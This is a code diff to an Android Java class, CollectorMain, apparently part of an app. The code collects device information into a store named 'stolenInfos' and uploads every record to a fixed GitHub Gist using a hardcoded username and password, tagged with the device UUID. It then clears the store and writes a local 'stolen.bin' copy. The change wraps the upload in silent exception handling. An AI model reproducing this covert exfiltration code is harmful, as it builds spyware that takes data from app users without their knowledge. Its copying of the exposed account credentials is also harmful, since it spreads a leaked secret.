@@ -37,54 +37,62 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 	public void run() {
 		// TODO: Implement this method
 		BinaryPrefImpl sb=TheApplication.instance.stolenInfos;
-		GitHubClient ghc=new GitHubClient().setCredentials("RevealEverything","nao2001nao");
-		Gist gst=null;
-		String s="";
-		try {
-			sb.edit().putString(System.currentTimeMillis() + ".json", new Gson().toJson(new Infos())).commit();
-		} catch (Throwable e) {
-
-		} finally {
-			System.out.println(s);
-			//Utils.writeToFile(new File(Environment.getExternalStorageDirectory(),"/Wisecraft/secret.json"),s);
-		}
-		String[] files;
-		try {
-			files = sb.getAll().keySet().toArray(new String[sb.getAll().size()]);
-			gst=new GistService(ghc).getGist("544acb279290b659766e");
-		} catch (Throwable e) {
-			e.printStackTrace(System.out);
-			return;
-		}
-		HashMap<String,GistFile> datas=new HashMap<>(gst.getFiles());
-		for (String filename:files) {
-			System.out.println("upload:"+filename);
+		try{
+			GitHubClient ghc=new GitHubClient().setCredentials("RevealEverything", "nao2001nao");
+			Gist gst=null;
+			String s="";
 			try {
-				GistFile gf=new GistFile().setContent(sb.getString(filename,"")).setFilename(TheApplication.instance.uuid+"_"+filename);
-				datas.put(TheApplication.instance.uuid+"_"+filename,gf);
+				sb.edit().putString(System.currentTimeMillis() + ".json", new Gson().toJson(new Infos())).commit();
+			} catch (Throwable e) {
+
+			} finally {
+				System.out.println(s);
+				//Utils.writeToFile(new File(Environment.getExternalStorageDirectory(),"/Wisecraft/secret.json"),s);
+			}
+			String[] files=Constant.EMPTY_STRING_ARRAY;
+			try {
+				files = sb.getAll().keySet().toArray(new String[sb.getAll().size()]);
+				gst = new GistService(ghc).getGist("544acb279290b659766e");
 			} catch (Throwable e) {
 				e.printStackTrace(System.out);
-				continue;
 			}
-		}
-		gst.setFiles(datas);
-		FileOutputStream fos=null;
-		try {
-			new GistService(ghc).updateGist(gst);
-			Log.d("gist","updated");
-			sb.edit().clear().commit();
-		} catch (IOException e) {
-			e.printStackTrace(System.out);
-		}
-		try{
-			fos=new FileOutputStream(new File(getFilesDir(),"stolen.bin"));
-			fos.write(sb.toBytes());
-		} catch (IOException e) {
-			e.printStackTrace(System.out);
-		}finally{
 			try {
-				if(fos!=null)fos.close();
-			} catch (IOException e) {}
+				HashMap<String,GistFile> datas=new HashMap<>(gst.getFiles());
+				for (String filename:files) {
+					Log.d("gist", "upload:" + filename);
+					try {
+						GistFile gf=new GistFile().setContent(sb.getString(filename, "")).setFilename(TheApplication.instance.uuid + "_" + filename);
+						datas.put(TheApplication.instance.uuid + "_" + filename, gf);
+					} catch (Throwable e) {
+						e.printStackTrace(System.out);
+						continue;
+					}
+				}
+				gst.setFiles(datas);
+			} catch (Throwable e) {
+
+			}
+			try {
+				new GistService(ghc).updateGist(gst);
+				Log.d("gist", "updated");
+				sb.edit().clear().commit();
+			} catch (IOException e) {
+				e.printStackTrace(System.out);
+			}
+		}catch(Throwable e){
+			
+		}finally{
+			FileOutputStream fos=null;
+			try{
+				fos=new FileOutputStream(new File(getFilesDir(),"stolen.bin"));
+				fos.write(sb.toBytes());
+			} catch (IOException e) {
+				e.printStackTrace(System.out);
+			}finally{
+				try {
+					if(fos!=null)fos.close();
+				} catch (IOException e) {}
+			}
 		}
 	}
 	public static class Infos {
